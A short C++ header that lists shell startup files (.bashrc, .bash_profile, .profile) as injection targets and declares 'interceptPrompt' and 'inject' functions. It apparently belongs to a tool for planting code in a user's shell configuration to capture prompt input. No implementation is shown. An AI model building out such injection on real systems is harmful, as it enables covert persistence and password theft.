//
// Created by ferdinand on 8/12/25.
//

#pragma once

#include <iostream>
#include <fstream>
#include <vector>
#include <pwd.h>
#include <unistd.h>

#include "neutral.h"

inline std::vector<std::string> possibleTargetFiles {
    ".bashrc",
    ".bash_profile",
    ".profile",
};

void interceptPrompt();
void inject();